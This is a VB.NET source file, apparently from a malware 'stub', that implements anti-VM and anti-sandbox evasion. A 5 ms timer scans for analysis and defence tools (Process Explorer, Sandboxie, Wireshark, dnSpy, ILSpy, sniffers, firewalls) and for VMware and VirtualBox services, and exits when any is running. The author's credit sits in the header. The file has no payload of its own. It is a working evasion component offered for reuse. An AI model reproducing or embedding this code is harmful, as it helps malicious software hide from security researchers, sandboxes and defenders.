Imports System
Imports System.Diagnostics
Imports System.Timers
Imports Microsoft.VisualBasic.CompilerServices

Namespace Stub
    Public Class MyAntiProcess

        '########################
        '#  Anti-VM + Anti-Sand #
        '#  Humoud Al-Juraid    #
        '#      @HumoudMJ       #
        '# Please Donot remove  #
        '#	    my credit       #
        '########################


        Public Shared Sub Handler(ByVal sender As Object, ByVal e As ElapsedEventArgs)

            Dim process As Process
            For Each process In Process.GetProcessesByName("procexp")
                ProjectData.EndApp()
            Next


            Dim process2 As Process
            For Each process2 In Process.GetProcessesByName("SbieCtrl")
                ProjectData.EndApp()
            Next


            Dim process3 As Process
            For Each process3 In Process.GetProcessesByName("SpyTheSpy")
                ProjectData.EndApp()
            Next


            Dim process4 As Process
            For Each process4 In Process.GetProcessesByName("wireshark")
                ProjectData.EndApp()
            Next


            Dim process5 As Process
            For Each process5 In Process.GetProcessesByName("apateDNS")
                ProjectData.EndApp()
            Next


            Dim process6 As Process
            For Each process6 In Process.GetProcessesByName("IPBlocker")
                ProjectData.EndApp()
            Next


            Dim process7 As Process
            For Each process7 In Process.GetProcessesByName("TiGeR-Firewall")
                ProjectData.EndApp()
            Next


            Dim process8 As Process
            For Each process8 In Process.GetProcessesByName("smsniff")
                ProjectData.EndApp()
            Next


            Dim process9 As Process
            For Each process9 In Process.GetProcessesByName("exeinfoPE")
                ProjectData.EndApp()
            Next


            Dim process10 As Process
            For Each process10 In Process.GetProcessesByName("NetSnifferCs")
                ProjectData.EndApp()
            Next


            Dim process11 As Process
            For Each process11 In Process.GetProcessesByName("Sandboxie Control")
                ProjectData.EndApp()
            Next


            Dim process12 As Process
            For Each process12 In Process.GetProcessesByName("processhacker")
                ProjectData.EndApp()
            Next


            Dim process15 As Process
            For Each process15 In Process.GetProcessesByName("dnSpy")
                ProjectData.EndApp()
            Next

            Dim process16 As Process
            For Each process16 In Process.GetProcessesByName("CodeReflect")
                ProjectData.EndApp()
            Next

            Dim process17 As Process
            For Each process17 In Process.GetProcessesByName("Reflector")
                ProjectData.EndApp()
            Next

            Dim process18 As Process
            For Each process18 In Process.GetProcessesByName("ILSpy")
                ProjectData.EndApp()
            Next

            Dim process19 As Process
            For Each process19 In Process.GetProcessesByName("VGAuthService")
                ProjectData.EndApp()
            Next

            Dim process20 As Process
            For Each process20 In Process.GetProcessesByName("VBoxService")
                ProjectData.EndApp()
            Next

        End Sub

        Public Shared Sub Start()
            MyAntiProcess.Timer = New Timer(5)
            AddHandler MyAntiProcess.Timer.Elapsed, New ElapsedEventHandler(AddressOf MyAntiProcess.Handler)
            MyAntiProcess.Timer.Enabled = True
        End Sub


        ' Fields
        Private Shared Timer As Timer
        Private Shared N As j.OK = New j.OK
    End Class
End Namespace

